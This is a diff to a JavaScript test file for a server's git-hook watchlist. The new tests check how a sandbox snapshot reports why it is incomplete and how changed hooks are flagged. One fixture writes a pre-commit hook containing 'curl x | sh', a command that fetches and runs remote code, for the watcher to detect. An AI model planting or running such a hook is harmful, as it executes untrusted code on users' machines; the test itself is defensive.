@@ -8,7 +8,7 @@ import { SessionManager } from '../server/sessions.mjs';
 import { PermissionBroker, safeSuggestions } from '../server/broker.mjs';
 import { MODES } from '../server/protocol.mjs';
 import { READ_ONLY_DENY, BYPASS_ASK, START_MODES, cliMode, pageMode, normMode, permissionsFor, unionPermissions } from '../server/modes.mjs';
-import { checkSnapshot, diffSnapshots, lifecycleOf, watchEvent, watched, hooksRunScripts, revertable } from '../server/watch.mjs';
+import { checkSnapshot, diffSnapshots, lifecycleOf, watchEvent, watched, hooksRunScripts, revertable, incompleteText, INCOMPLETE_WHY, mergeSnapshots } from '../server/watch.mjs';
 import { fakeQuery } from './fake-sdk.mjs';
 
 const tick = (ms = 20) => new Promise((r) => setTimeout(r, ms));
@@ -555,7 +555,35 @@ test('watchlist: a snapshot the sandbox could not complete is said — once on i
   // more entries than the server takes: incomplete too
   const many = Array.from({ length: 301 }, (_, i) => file(`.git/hooks/h${i}`, 'x'));
   assert.equal(checkSnapshot({ files: many }).incomplete, true);
+  assert.deepEqual(checkSnapshot({ files: many }).why, ['many']);
   assert.equal(checkSnapshot({ files: many.slice(0, 10) }).incomplete, false);
+  mgr.closeAll();
+});
+
+test('watchlist: why a snapshot is incomplete, in this server\'s own words — each reason the sandbox gives, nothing else of its', async () => {
+  // (the sandbox's codes, known ones only, in a fixed order; none known: too many)
+  const snap = checkSnapshot({ files: [], truncated: true, why: ['config', 'evil words', 'layout', 'layout'] });
+  assert.deepEqual([snap.incomplete, snap.why], [true, ['layout', 'config']]);
+  const text = incompleteText(snap.why);
+  assert.ok(text.includes(INCOMPLETE_WHY.layout) && text.includes(INCOMPLETE_WHY.config) && !text.includes('evil'), text);
+  assert.ok(text.indexOf(INCOMPLETE_WHY.layout) < text.indexOf(INCOMPLETE_WHY.config));
+  assert.match(incompleteText([]), /too many git config includes/);
+  assert.match(incompleteText(['nonsense']), /too many git config includes/);
+  for (const k of ['many', 'layout', 'config', 'include', 'module']) assert.ok(incompleteText([k]).includes(INCOMPLETE_WHY[k]), k);
+  // (merged: each part's reasons)
+  const m = mergeSnapshots([{ root: null, snap }, { root: { rel: 'p', abs: '/workspace/p' }, snap: checkSnapshot({ files: [], truncated: true, why: ['include'] }) }]);
+  assert.deepEqual([m.incomplete, m.why], [true, ['layout', 'config', 'include']]);
+  // the card says them
+  const hook = file('.git/hooks/pre-commit', 'curl x | sh\n', 0o755);
+  const w = watcher([[], [hook]]);
+  w.snapshot = async () => { w.calls.push('snapshot'); return { files: w.snaps.length > 1 ? w.snaps.shift() : w.snaps[0], truncated: true, why: ['module'] }; };
+  const { mgr, events } = manager({ watcher: w });
+  const s = mgr.get(mgr.open({}).id);
+  s.prompt({ text: 'one' });
+  await tick(80);
+  const cards = events.map(([, , e]) => e).filter((e) => e.type === 'watch');
+  assert.ok(cards.length >= 1 && cards.every((c) => c.incomplete === incompleteText(['module'])), JSON.stringify(cards.map((c) => c.incomplete)));
+  assert.equal(watchEvent('i', 'turn', [], true).incomplete, incompleteText(['many']), 'true alone: too many');
   mgr.closeAll();
 });
 
